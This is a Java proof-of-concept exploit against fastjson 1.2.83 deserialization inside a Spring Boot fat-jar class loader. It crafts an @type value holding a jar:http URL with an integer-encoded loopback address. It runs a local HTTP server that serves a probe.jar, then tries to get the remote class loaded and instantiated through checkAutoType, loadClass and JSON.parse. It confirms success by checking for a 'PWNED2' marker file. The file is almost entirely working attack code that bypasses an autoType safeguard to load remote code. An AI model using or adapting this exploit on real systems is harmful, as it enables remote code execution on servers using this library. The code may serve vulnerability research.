import com.alibaba.fastjson.parser.ParserConfig;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class Test2 {
    private static final List<String> HITS = Collections.synchronizedList(new ArrayList<String>());
    private static final int PORT = Integer.getInteger("poc.port", 18080);
    private static final String TYPE = "jar:http:..2130706433:" + PORT + ".probe!.POC";
    private static byte[] probeJar;

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            usage();
            return;
        }

        String mode = args[0];
        loadProbeJar();
        startServer();
        Thread.sleep(300L);

        if (mode.startsWith("sb27") || mode.startsWith("sb15")) {
            org.springframework.boot.loader.jar.JarFile.registerUrlProtocolHandler();
            URL[] urls = new URL[] {
                    new URL("jar:" + fastjsonJar().toURI().toURL() + "!/"),
                    classesDir().toURI().toURL()
            };
            System.out.println("[setup] fatjar urls = " + Arrays.toString(urls));
            ClassLoader parent = ClassLoader.getSystemClassLoader().getParent();
            ClassLoader fatClassLoader = new org.springframework.boot.loader.LaunchedURLClassLoader(urls, parent);
            System.out.println("[setup] fatClassLoader = " + fatClassLoader.getClass().getName());

            if (mode.endsWith("-direct")) {
                String resourceName = TYPE.replace('.', '/') + ".class";
                System.out.println("[direct] getResource(\"" + resourceName + "\")");
                URL url = fatClassLoader.getResource(resourceName);
                System.out.println("[direct] -> URL = " + url);
                if (url != null) {
                    InputStream input = url.openStream();
                    byte[] buffer = new byte[16];
                    int read = input.read(buffer);
                    System.out.println("[direct] -> openStream read " + read + " bytes, first4="
                            + (read >= 4 ? String.format("%02x %02x %02x %02x", buffer[0], buffer[1], buffer[2], buffer[3]) : "-"));
                    input.close();
                }
            } else if (mode.endsWith("-check")) {
                ParserConfig config = new ParserConfig();
                config.setDefaultClassLoader(fatClassLoader);
                try {
                    Class<?> clazz = config.checkAutoType(TYPE, null);
                    System.out.println("[check] checkAutoType returned: " + clazz);
                } catch (Throwable throwable) {
                    System.out.println("[check] checkAutoType threw: " + throwable);
                }
            } else if (mode.endsWith("-load")) {
                try {
                    Class<?> clazz = fatClassLoader.loadClass(TYPE);
                    System.out.println("[load] loadClass OK -> " + clazz + " loader=" + clazz.getClassLoader());
                    Object instance = clazz.newInstance();
                    System.out.println("[load] newInstance OK -> " + instance.getClass().getName());
                } catch (Throwable throwable) {
                    System.out.println("[load] threw: " + throwable);
                }
            } else if (mode.endsWith("-parse")) {
                ParserConfig.getGlobalInstance().setDefaultClassLoader(fatClassLoader);
                try {
                    Object parsed = com.alibaba.fastjson.JSON.parse("{\"@type\":\"" + TYPE + "\",\"x\":1}");
                    System.out.println("[parse] parsed -> " + describe(parsed));
                } catch (Throwable throwable) {
                    System.out.println("[parse] threw: " + throwable);
                }
            } else if (mode.endsWith("-fatrun")) {
                Class<?> runner = Class.forName("FatRunner", true, fatClassLoader);
                Method main = runner.getMethod("main", String[].class);
                main.invoke(null, (Object) new String[] { "{\"@type\":\"" + TYPE + "\",\"x\":1}" });
            } else {
                usage();
            }
        } else {
            usage();
        }

        Thread.sleep(1500L);
        System.out.println("[server] requests: " + HITS.size());
        for (String hit : HITS) {
            System.out.println("[server] " + hit);
        }
        System.out.println("[pwned] PWNED2 exists: " + pwnedFile().exists());
        System.exit(0);
    }

    private static void loadProbeJar() throws Exception {
        File probe = new File(System.getProperty("poc.probeJar", "probe.jar"));
        if (probe.exists()) {
            probeJar = Files.readAllBytes(probe.toPath());
            System.out.println("[setup] probe jar loaded from " + probe.getAbsolutePath() + ", " + probeJar.length + " bytes");
        } else {
            System.out.println("[setup] probe.jar was not found; the local server will return 404");
        }
    }

    private static File fastjsonJar() {
        return firstExisting(
                System.getProperty("poc.fastjsonJar"),
                "lib/fastjson-1.2.83.jar",
                "target/dependency/fastjson-1.2.83.jar");
    }

    private static File classesDir() {
        return firstExisting(
                System.getProperty("poc.classesDir"),
                "target/classes",
                ".");
    }

    private static File pwnedFile() {
        return new File(System.getProperty("poc.pwnedFile", "PWNED2"));
    }

    private static File firstExisting(String explicit, String first, String second) {
        if (explicit != null && !explicit.trim().isEmpty()) {
            return requireFile(new File(explicit));
        }
        File file = new File(first);
        if (file.exists()) {
            return file;
        }
        return requireFile(new File(second));
    }

    private static File requireFile(File file) {
        if (!file.exists()) {
            throw new IllegalStateException("Required path not found: " + file.getAbsolutePath());
        }
        return file.getAbsoluteFile();
    }

    private static String describe(Object value) {
        if (value == null) {
            return "null";
        }
        return value.getClass().getName() + " " + value;
    }

    private static void startServer() {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try (ServerSocket serverSocket = new ServerSocket(PORT, 50, InetAddress.getByName("127.0.0.1"))) {
                    serverSocket.setSoTimeout(15000);
                    long end = System.currentTimeMillis() + 14000L;
                    while (System.currentTimeMillis() < end) {
                        try {
                            Socket socket = serverSocket.accept();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));
                            String line = reader.readLine();
                            HITS.add("connection from " + socket.getRemoteSocketAddress() + " request: " + line);
                            while ((line = reader.readLine()) != null && !line.isEmpty()) {
                                // Drain request headers.
                            }
                            OutputStream output = socket.getOutputStream();
                            if (probeJar != null) {
                                output.write(("HTTP/1.1 200 OK\r\nContent-Type: application/java-archive\r\nContent-Length: "
                                        + probeJar.length + "\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
                                output.write(probeJar);
                                HITS.add("-> served probe.jar (200, " + probeJar.length + " bytes)");
                            } else {
                                output.write("HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".getBytes("UTF-8"));
                                HITS.add("-> 404");
                            }
                            output.flush();
                            socket.close();
                        } catch (SocketTimeoutException timeout) {
                            break;
                        } catch (Exception exception) {
                            HITS.add("server error: " + exception);
                        }
                    }
                } catch (Exception exception) {
                    System.out.println("[server] failed to start: " + exception);
                }
            }
        }, "poc-http-jar");
        thread.setDaemon(true);
        thread.start();
    }

    private static void usage() {
        System.out.println("Usage: java Test2 <sb27-direct|sb27-check|sb27-load|sb27-parse|sb27-fatrun|sb15-direct|sb15-check|sb15-load|sb15-parse|sb15-fatrun>");
    }
}
